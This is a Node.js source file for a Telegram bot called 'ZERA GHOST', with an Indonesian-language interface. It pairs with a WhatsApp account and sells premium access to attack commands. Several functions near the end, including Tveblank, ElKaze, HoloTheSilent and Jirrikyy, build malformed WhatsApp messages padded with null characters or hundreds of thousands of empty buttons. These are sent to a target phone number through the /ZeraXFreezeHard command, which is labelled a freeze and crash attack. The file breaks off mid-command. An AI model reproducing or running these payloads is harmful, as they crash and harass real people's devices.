'use strict';

(async () => {

// ============================================================
// ===== LICENSE GUARD (WAJIB PALING ATAS) =====
// ============================================================
global.ZERA_MODE = 'wa'; // HARUS sebelum require jhonaley

const nodeCrypto = require('crypto');
const _lic = require('./config/jhonaley');

const _expectedSig = nodeCrypto.createHash('sha256')
  .update(['j','h','o','n','-','v','5','-','g','u','a','r','d','-','2','0','2','6'].join('') + '#exports#v1')
  .digest('hex');

if (
  !_lic ||
  _lic.__sig !== _expectedSig ||
  typeof _lic.promptCredentials !== 'function' ||
  typeof _lic.startPeriodicRevalidation !== 'function' ||
  typeof _lic.lockGlobalToken !== 'function' ||
  typeof _lic.verifyRunGuard !== 'function'
) {
  console.log('\x1b[31m[FATAL] License module signature mismatch / replaced. Bot dihentikan.\x1b[0m');
  process.exit(4);
}

if (!_lic.verifyRunGuard()) {
  console.log('\x1b[31m[FATAL] Direct execution diblokir.\x1b[0m');
  process.exit(4);
}

if (global.botToken && String(global.botToken).length > 10) {
  _lic.reportTamper({
    license_key: 'PRESTART',
    kind: 'pre_token_set',
    detail: 'global.botToken sudah berisi sebelum validasi'
  });
  console.log('\x1b[31m[FATAL] global.botToken sudah diset sebelum validasi. Tamper terdeteksi.\x1b[0m');
  process.exit(4);
}

// ============================================================
// ===== REQUIRES =====
// ============================================================
const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events');

// ============================================================
// ===== VALIDATE LICENSE (WAJIB SEBELUM BOT JALAN) =====
// ============================================================
const { token: _validatedToken, license: _validatedLicense } = await _lic.promptCredentials();
_lic.startPeriodicRevalidation({ license: _validatedLicense, token: _validatedToken });
_lic.lockGlobalToken();

global.ZERA_TOKEN = _validatedToken;
global.ZERA_LICENSE = _validatedLicense;

// ============================================================
// ===== CONFIG =====
// ============================================================
const _cfg = require("./settings/config");
const tokenBot = _validatedToken;
const licenseKey = _validatedLicense;
const ownerID = _cfg.ownerID;
const CHANNEL_USERNAME = _cfg.CHANNEL_USERNAME;
const CHANNEL_USERNAME2 = _cfg.CHANNEL_USERNAME2;

// ═══════════════════════════════════════════════════════════
// ~~~~ RICH MESSAGE HELPERS
// ═══════════════════════════════════════════════════════════
function htmlToPlain(html) {
  return String(html)
    .replace(/<hr\s*\/?>/gi, "\n━━━━━━━━━━━━━━━━━━━━━━\n")
    .replace(/<\/?(h[1-6]|table|tr|th|td|caption|figure|details|summary|aside|footer|mark|time|blockquote|pre|br|img|code|b|i|u|s|tg-emoji)[^>]*>/gi, (m) => {
      const t = m.toLowerCase();
      if (t.startsWith("</")) {
        if (t.startsWith("</tr") || t.startsWith("</table") || t.startsWith("</h")) return "\n";
        if (t.startsWith("</td") || t.startsWith("</th")) return " | ";
        if (t.startsWith("</footer") || t.startsWith("</caption")) return "\n";
        return "";
      }
      if (t.startsWith("<br")) return "\n";
      return "";
    })
    .replace(/<[^>]+>/g, "")
    .replace(/[ \t]+\|/g, " | ")
    .replace(/\|\s*\n/g, "\n")
    .replace(/\n{3,}/g, "\n\n")
    .trim();
}

let richDraftTransportDisabled = false;

function richDraftId() {
  return (Date.now() + Math.floor(Math.random() * 1000)) % 2147483647 || 1;
}

function delay(ms = 1000) {
  return new Promise(r => setTimeout(r, Math.max(0, Number(ms) || 0)));
}

function getDraftDelay() {
  return 1000;
}

async function sendRichMessageDraft(telegram, chatId, draftText = 'Memuat tampilan...') {
  if (!chatId) return null;
  if (richDraftTransportDisabled) return null;

  const token = telegram?.token
    || telegram?.telegram?.token
    || bot?.telegram?.token
    || tokenBot;

  const cleanText = String(draftText || 'Memuat tampilan...')
    .replace(/<[^>]+>/g, '')
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, 80) || 'Memuat tampilan...';

  try {
    const res = await axios.post(
      `https://api.telegram.org/bot${token}/sendRichMessageDraft`,
      {
        chat_id: chatId,
        draft_id: richDraftId(),
        rich_message: {
          html: `<tg-thinking>${cleanText}</tg-thinking>`
        }
      },
      { timeout: 8000, validateStatus: () => true }
    );

    if (!res.data?.ok) {
      const desc = String(res.data?.description || '');
      if (/method not found|not found|unsupported|unknown method/i.test(desc)) {
        richDraftTransportDisabled = true;
      }
      return null;
    }
    return res.data.result;
  } catch (e) {
    return null;
  }
}

async function withLoadingDraft(telegram, chatId, options, runner) {
  if (options && options.__skipDraft) return runner();
  const hint = (options && options.loadingText) || 'Memuat Menu';
  try {
    await sendRichMessageDraft(telegram, chatId, hint);
    await delay(getDraftDelay());
  } catch (_) {}
  return runner();
}

function richButtonRowsHtml(keyboard) {
  try {
    const rows = keyboard?.inline_keyboard;
    if (!Array.isArray(rows)) return "";

    const esc = (s) => String(s ?? "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");

    const out = [];
    for (const row of rows.slice(0, 50)) {
      if (!Array.isArray(row) || !row.length) continue;
      const buttons = [];
      for (const b of row.slice(0, 8)) {
        if (!b) continue;
        if (b.request_location || b.request_contact || b.web_app ||
            b.switch_inline_query || b.switch_inline_query_current_chat) continue;

        const text = esc(String(b.text || "Button").replace(/\n/g, " "));
        const style = ["danger", "success", "primary", "link"].includes(b.style) ? b.style : "primary";

        if (b.url) {
          buttons.push(`<tg-button type="url" style="${style}" url="${esc(b.url)}">${text}</tg-button>`);
        } else if (b.callback_data) {
          const cb = String(b.callback_data).slice(0, 64);
          buttons.push(`<tg-button type="callback_data" style="${style}" data="${esc(cb)}">${text}</tg-button>`);
        }
      }
      if (buttons.length) out.push(`<tg-button-row>${buttons.join("")}</tg-button-row>`);
    }
    return out.join("");
  } catch (e) {
    return "";
  }
}

async function sendRichTG(telegram, chatId, html, options = {}) {
  return withLoadingDraft(telegram, chatId, options, async () => {
    const token = telegram?.token
      || telegram?.telegram?.token
      || bot?.telegram?.token
      || tokenBot;

    const buttonRows = options.reply_markup ? richButtonRowsHtml(options.reply_markup) : "";
    const fullHtml = buttonRows ? `${html}\n${buttonRows}` : html;

    try {
      const payload = { chat_id: chatId, rich_message: { html: fullHtml } };
      if (options.disable_web_page_preview) payload.disable_web_page_preview = true;
      const res = await axios.post(
        `https://api.telegram.org/bot${token}/sendRichMessage`,
        payload, { timeout: 15000 }
      );
      if (res.data?.ok) return res.data.result;
      throw new Error(res.data?.description || 'sendRichMessage failed');
    } catch (e) {
      try {
        const plain = htmlToPlain(html);
        const opts = { parse_mode: "HTML" };
        if (options.reply_markup) opts.reply_markup = options.reply_markup;
        if (options.disable_web_page_preview) opts.disable_web_page_preview = true;
        return await telegram.sendMessage(chatId, plain || '…', opts);
      } catch (e2) { return null; }
    }
  });
}

async function sendRichPhoto(telegram, chatId, photoUrl, html, options = {}) {
  return withLoadingDraft(telegram, chatId, options, async () => {
    const token = telegram?.token
      || telegram?.telegram?.token
      || bot?.telegram?.token
      || tokenBot;

    const buttonRows = options.reply_markup ? richButtonRowsHtml(options.reply_markup) : "";
    const fullHtml = `<img src="${photoUrl}"/>\n${html}${buttonRows ? `\n${buttonRows}` : ""}`;

    try {
      const payload = { chat_id: chatId, rich_message: { html: fullHtml } };
      const res = await axios.post(
        `https://api.telegram.org/bot${token}/sendRichMessage`,
        payload, { timeout: 15000 }
      );
      if (res.data?.ok) return res.data.result;
      throw new Error(res.data?.description || 'sendRichMessage failed');
    } catch (e) {
      try {
        const caption = htmlToPlain(html).slice(0, 1024);
        const opts = { caption, parse_mode: "HTML" };
        if (options.reply_markup) opts.reply_markup = options.reply_markup;
        return await telegram.sendPhoto(chatId, photoUrl, opts);
      } catch (e2) { return null; }
    }
  });
}

console.log(chalk.bold.red(`ZERA GHOST LOADED`));

const question = (query) => new Promise((resolve) => {
  const rl = require('readline').createInterface({ input: process.stdin, output: process.stdout });
  rl.question(query, (answer) => { rl.close(); resolve(answer); });
});

const bot = new Telegraf(tokenBot);

let secureMode = false;
function activateSecureMode() { secureMode = true; }

bot.use((ctx, next) => { if (secureMode) return; return next(); });

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(premiumFile)) fs.writeFileSync(premiumFile, '{}');
if (!fs.existsSync(cooldownFile)) fs.writeFileSync(cooldownFile, '{"cooldown":5}');

const loadPremiumUsers = () => { try { return JSON.parse(fs.readFileSync(premiumFile)); } catch (err) { return {}; } };
const savePremiumUsers = (users) => { fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2)); };

const addPremiumUser = (userId, duration) => {
  const premiumUsers = loadPremiumUsers();
  const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
  premiumUsers[userId] = expiryDate;
  savePremiumUsers(premiumUsers);
  return expiryDate;
};

const removePremiumUser = (userId) => {
  const premiumUsers = loadPremiumUsers();
  delete premiumUsers[userId];
  savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
  const premiumUsers = loadPremiumUsers();
  if (premiumUsers[userId]) {
    const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
    if (moment().isBefore(expiryDate)) return true;
    removePremiumUser(userId);
    return false;
  }
  return false;
};

const loadCooldown = () => { try { return JSON.parse(fs.readFileSync(cooldownFile)).cooldown || 5; } catch { return 5; } };
const saveCooldown = (seconds) => { fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2)); };

let cooldown = loadCooldown();
const userCooldowns = new Map();

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600); sec %= 3600;
  let mins = Math.floor(sec / 60); sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const makeInMemoryStore = ({ logger = console } = {}) => {
  const ev = new EventEmitter();
  let chats = {}, messages = {}, contacts = {};
  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;
      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);
      if (messages[chatId].length > 100) messages[chatId].shift();
      chats[chatId] = { ...(chats[chatId] || {}), id: chatId, name: msg.pushName, lastMsgTimestamp: +msg.messageTimestamp };
    }
  });
  ev.on('chats.set', ({ chats: newChats }) => { for (const chat of newChats) chats[chat.id] = chat; });
  ev.on('contacts.set', ({ contacts: newContacts }) => { for (const id in newContacts) contacts[id] = newContacts[id]; });
  return {
    chats, messages, contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m));
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c));
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c));
    },
    logger
  };
};

const thumbnailUrl = "https://files.catbox.moe/77e5mq.jpg";

function createSafeSock(sock) {
  let sendCount = 0;
  const MAX_SENDS = 500;
  const normalize = j => j && j.includes("@") ? j : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
      const jid = normalize(target);
      return await sock.sendMessage(jid, message);
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
      const jid = normalize(target);
      return await sock.relayMessage(jid, messageObj, opts);
    },
    presenceSubscribe: async jid => { try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){} },
    sendPresenceUpdate: async (state,jid) => { try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){} }
  };
}

function startBot() {
  console.log(chalk.green(`ZERA GHOST - BOT STARTED`));
}

const startSesi = async () => {
  console.clear();
  console.log(chalk.bold.red(`ZERA GHOST - CONNECTING...`));
  const store = makeInMemoryStore({ logger: require('pino')().child({ level: 'silent', stream: 'store' }) });
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();
  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({ conversation: 'Evox' }),
  };
  sock = makeWASocket(connectionOptions);
  sock.ev.on("messages.upsert", async (m) => { try { if (!m || !m.messages || !m.messages[0]) return; } catch (error) {} });
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);
  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'open') {
      if (lastPairingMessage) {
        const connectedHtml = `
<h3>✅ PAIRING CONNECTED</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>☐ Number</td><td>${lastPairingMessage.phoneNumber}</td></tr>
  <tr><td>☐ Pairing Code</td><td><code>${lastPairingMessage.pairingCode}</code></td></tr>
  <tr><td>☐ Type</td><td>✅ Connected</td></tr>
</table>
`;
        try {
          if (lastPairingMessage.messageId) {
            bot.telegram.deleteMessage(lastPairingMessage.chatId, lastPairingMessage.messageId).catch(() => {});
          }
          sendRichPhoto(bot.telegram, lastPairingMessage.chatId, thumbnailUrl, connectedHtml, { __skipDraft: true }).catch(() => {});
        } catch (e) { console.error("pairing update err:", e.message); }
      }
      console.clear();
      isWhatsAppConnected = true;
      console.log(chalk.bold.yellow(`Sender Connected`));
    }
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red('Koneksi WhatsApp terputus:'), shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi');
      if (shouldReconnect) startSesi();
      isWhatsAppConnected = false;
    }
  });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 SENDER OFFLINE</h3><hr/><table border="1"><tr><td>Tidak ada sender yang terhubung</td></tr></table>`, { loadingText: 'Memuat Status' });
    return;
  }
  next();
};

const checkCooldown = (ctx, next) => {
  const userId = ctx.from.id;
  const now = Date.now();
  if (userCooldowns.has(userId)) {
    const lastUsed = userCooldowns.get(userId);
    const diff = (now - lastUsed) / 1000;
    if (diff < cooldown) {
      const remaining = Math.ceil(cooldown - diff);
      sendRichTG(ctx.telegram, ctx.chat.id, `<h3>⏳ COOLDOWN</h3><hr/><table border="1"><tr><td>Harap menunggu <b>${remaining}</b> detik</td></tr></table>`, { loadingText: 'Memuat Cooldown' });
      return;
    }
  }
  userCooldowns.set(userId, now);
  next();
};

const checkPremium = (ctx, next) => {
  if (!isPremiumUser(ctx.from.id)) {
    sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ACCESS DENIED</h3><hr/><table border="1"><tr><td>Akses hanya untuk premium</td></tr></table>`, { loadingText: 'Memuat Akses' });
    return;
  }
  next();
};

async function checkJoin(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(`@${CHANNEL_USERNAME}`, ctx.from.id);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (err) {
    console.log("CHECK JOIN ERROR:", err.message);
    return false;
  }
}

bot.use(async (ctx, next) => {
  try {
    if (!ctx.from) return next();
    const text = ctx.message?.text;
    if (!text) return next();
    if (!text.startsWith("/")) return next();
    const joined = await checkJoin(ctx);
    if (!joined) {
      return sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>⚠️ WAJIB JOIN CHANNEL</h3>
<hr/>
<table border="1">
  <tr><th>Channel</th></tr>
  <tr><td>Channel 1</td></tr>
  <tr><td>Channel 2</td></tr>
</table>
<hr/>
<footer>Kalo udah join, ketik /start ulang</footer>
`, {
        loadingText: 'Memuat Info',
        reply_markup: {
          inline_keyboard: [
            [{ text: "Join Channel", url: `https://t.me/${CHANNEL_USERNAME}`, style: "primary" }],
            [{ text: "Join Channel 2", url: `https://t.me/${CHANNEL_USERNAME2}`, style: "success" }]
          ]
        }
      });
    }
    return next();
  } catch (e) {
    console.log("MIDDLEWARE JOIN ERROR:", e.message);
    return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Error cek akses channel</td></tr></table>`, { loadingText: 'Memuat Error' });
  }
});

bot.command("addsender", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ AKSES DITOLAK</h3><hr/><table border="1"><tr><td>Akses hanya untuk pemilik</td></tr></table>`, { loadingText: 'Memuat Akses' });
  }
  const args = ctx.message.text.split(" ")[1];
  if (!args) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/addsender 62xxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Nomor tidak valid</td></tr></table>`, { loadingText: 'Memuat Error' });
  try {
    if (!sock) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Socket belum siap</td></tr></table>`, { loadingText: 'Memuat Error' });
    if (sock.authState.creds.registered) {
      return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>✅ SUDAH CONNECTED</h3><hr/><table border="1"><tr><td>WhatsApp sudah terhubung: ${phoneNumber}</td></tr></table>`, { loadingText: 'Memuat Status' });
    }
    const code = await sock.requestPairingCode(phoneNumber, "XWOLVER1");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
    const pairingHtml = `
<h3>📱 PROSES PAIRING</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>☐ Number</td><td>${phoneNumber}</td></tr>
  <tr><td>☐ Pairing Code</td><td><code>${formattedCode}</code></td></tr>
  <tr><td>☐ Type</td><td>⏳ Not Connected</td></tr>
</table>
`;
    const sentMsg = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, pairingHtml, { loadingText: 'Memuat Pairing' });
    lastPairingMessage = { chatId: ctx.chat.id, messageId: sentMsg?.message_id, phoneNumber, pairingCode: formattedCode };
  } catch (err) { console.error(err); }
});

bot.command("setcooldown", async (ctx) => {
  if (ctx.from.id != ownerID) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ AKSES DITOLAK</h3>`, { loadingText: 'Memuat Akses' });
  const args = ctx.message.text.split(" ");
  const seconds = parseInt(args[1]);
  if (isNaN(seconds) || seconds < 0) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/setcooldown 5</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  cooldown = seconds;
  saveCooldown(seconds);
  sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ COOLDOWN DIATUR</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Cooldown Baru</td><td><b>${seconds} detik</b></td></tr>
</table>
`, { loadingText: 'Memuat Settings' });
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ AKSES DITOLAK</h3>`, { loadingText: 'Memuat Akses' });
  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;
    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); deleted = true; }
    }
    if (deleted) {
      await sendRichTG(ctx.telegram, ctx.chat.id, `<h3>✅ SESSION DIHAPUS</h3><hr/><table border="1"><tr><td>Panel akan restart dalam 2 detik</td></tr></table>`, { loadingText: 'Memuat Reset' });
      setTimeout(() => { process.exit(1); }, 2000);
    } else {
      sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 TIDAK ADA SESSION</h3><hr/><table border="1"><tr><td>Tidak ada folder session</td></tr></table>`, { loadingText: 'Memuat Reset' });
    }
  } catch (err) { console.error(err); ctx.reply("❌ ☇ Gagal menghapus session"); }
});

bot.command('addprem', async (ctx) => {
  if (ctx.from.id != ownerID) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ AKSES DITOLAK</h3>`, { loadingText: 'Memuat Akses' });
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/addprem 12345678 30</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const userId = args[1];
  const duration = parseInt(args[2]);
  if (isNaN(duration)) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 ERROR</h3><hr/><table border="1"><tr><td>Durasi harus angka</td></tr></table>`, { loadingText: 'Memuat Error' });
  const expiryDate = addPremiumUser(userId, duration);
  sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ PREMIUM DITAMBAH</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>User ID</td><td><code>${userId}</code></td></tr>
  <tr><td>Durasi</td><td>${duration} hari</td></tr>
  <tr><td>Expired</td><td><b>${expiryDate}</b></td></tr>
</table>
`, { loadingText: 'Memuat Settings' });
});

bot.command('delprem', async (ctx) => {
  if (ctx.from.id != ownerID) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ AKSES DITOLAK</h3>`, { loadingText: 'Memuat Akses' });
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/delprem 12345678</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const userId = args[1];
  removePremiumUser(userId);
  sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ PREMIUM DIHAPUS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>User ID</td><td><code>${userId}</code></td></tr>
  <tr><td>Status</td><td>✅ Dihapus</td></tr>
</table>
`, { loadingText: 'Memuat Settings' });
});

bot.command('addgroup', async (ctx) => {
  if (ctx.from.id != ownerID) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ AKSES DITOLAK</h3>`, { loadingText: 'Memuat Akses' });
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/addgroup -12345678 30</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const groupId = args[1];
  const duration = parseInt(args[2]);
  if (isNaN(duration)) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 ERROR</h3><hr/><table border="1"><tr><td>Durasi harus angka</td></tr></table>`, { loadingText: 'Memuat Error' });
  const premiumUsers = loadPremiumUsers();
  const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
  premiumUsers[groupId] = expiryDate;
  savePremiumUsers(premiumUsers);
  sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ GROUP PREMIUM DITAMBAH</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Group ID</td><td><code>${groupId}</code></td></tr>
  <tr><td>Durasi</td><td>${duration} hari</td></tr>
  <tr><td>Expired</td><td><b>${expiryDate}</b></td></tr>
</table>
`, { loadingText: 'Memuat Settings' });
});

bot.command('delgroup', async (ctx) => {
  if (ctx.from.id != ownerID) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ AKSES DITOLAK</h3>`, { loadingText: 'Memuat Akses' });
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/delgroup -12345678</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const groupId = args[1];
  const premiumUsers = loadPremiumUsers();
  if (premiumUsers[groupId]) {
    delete premiumUsers[groupId];
    savePremiumUsers(premiumUsers);
    sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ GROUP PREMIUM DIHAPUS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Group ID</td><td><code>${groupId}</code></td></tr>
  <tr><td>Status</td><td>✅ Dihapus</td></tr>
</table>
`, { loadingText: 'Memuat Settings' });
  } else {
    sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 TIDAK ADA</h3><hr/><table border="1"><tr><td>${groupId} tidak ada di daftar premium</td></tr></table>`, { loadingText: 'Memuat Status' });
  }
});

async function Tveblank(sock, target) {
  try {
    await sock.relayMessage(target, {
      interactiveMessage: { body: { text: "hama" + "\u0000".repeat(50000) }, nativeFlowMessage: { buttons: [{ name: "call_permission_request", buttonParamsJson: JSON.stringify({ callType: "videoCall" }) }] } }
    }, { participant: { jid: target } });
    await sock.relayMessage(target, {
      interactiveMessage: { body: { text: "🩸⃟༑⌁⃰Tvexxxཀ‌‌🦠" + "\u0000".repeat(30000) }, nativeFlowMessage: { buttons: "tg_number_message".repeat(20000) } }
    }, { participant: { jid: target } });
    console.log("✅ TVE Kill you!");
  } catch (e) { console.log("❌ ERROR: anjj ", e.message); }
}

async function ElKaze(sock, target) {
  const msg = {
    groupStatusMessageV2: { message: { interactiveMessage: {
      body: { text: "KAZE EL REMI♤♡◇♧", display_text: "\u200C" },
      nativeFlowInfo: { name: "single_select", paramsJson: JSON.stringify({ icon: "document", title: "maklo?!", sections: Array.from({ length: 505555 }, () => ({})) }) },
      nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
    } } }
  };
  await sock.relayMessage(target, msg, {});
}

async function DelayHardKingKaze(sock, target) {
  const msg = {
    groupStatusMessageV2: { message: { interactiveMessage: {
      body: { text: "AWAS KING KAZE LEWATꦾ", display_text: "\u200C" },
      nativeFlowInfo: { name: "single_select", paramsJson: JSON.stringify({ icon: "document", title: "Texas?!", sections: Array.from({ length: 505555 }, () => ({})) }) },
      nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
    } } }
  };
  await sock.relayMessage(target, msg, {});
}

async function HoloTheSilent(sock, target) {
  const r = "\u0000" + "\uFDFD" + "\x10" + "\0";
  const t = 100000;
  const u = "{";
  const msg3 = { groupStatusMessageV2: { message: { interactiveMessage: { header: { title: "\0" }, body: { text: "nina" }, nativeFlowMessage: { buttons: ["nina"] }, nativeFlowResponseMessage: { buttons: ["nina"] } } } } };
  const msg1 = { groupStatusMessageV2: { message: { interactiveMessage: { body: { text: "nina" }, nativeFlowMessage: { buttons: u.repeat(t) }, nativeFlowResponseMessage: { buttons: ["nina"] } } } } };
  const msg2 = { groupStatusMessageV2: { message: { interactiveMessage: { body: { text: "nina" }, nativeFlowMessage: { buttons: r.repeat(t) }, nativeFlowResponseMessage: { buttons: ["nina"] } } } } };
  await sock.relayMessage(target, msg3, {});
  await sock.relayMessage(target, msg1, {});
  await sock.relayMessage(target, msg2, {});
}

async function FrezeXdelayTve(sock, target) {
  const msg = { groupStatusMessageV2: { message: { interactiveMessage: { body: { text: "\x10" }, nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) } } } } };
  await sock.relayMessage(target, msg, {});
}

async function Jirrikyy(sock, target) {
  const X = { groupStatusMessageV2: { message: { interactiveMessage: { body: { text: "ikyySinggle" }, nativeFlowMessage: { buttons: "meta_ai_message".repeat(30000) } } } } };
  const X2 = { groupStatusMessageV2: { message: { interactiveMessage: {
    body: { text: "ikyy Introvert" },
    nativeFlowMessage: { buttons: Array.from({length: 200900 }, () => ({})) },
    contextInfo: { quotedMessage: { statusAttributionType: 2, statusAttributions: Array.from({ length: 200900 }, () => ({})), type: 1, display_text: "IkyyJones", vcard: null } }
  } } } };
  await sock.relayMessage(target, X, {});
  await sock.relayMessage(target, X2, {});
  return { participant: true };
}

bot.command("ZeraXFreezeHard", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/ZeraXFreezeHard 62xxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMsg = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>⚡ ZERA GHOST — PROCESS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Freeze X Crash Hard Bebas Spam</td></tr>
  <tr><td>Status</td><td>⏳ Process</td></tr>
</table>
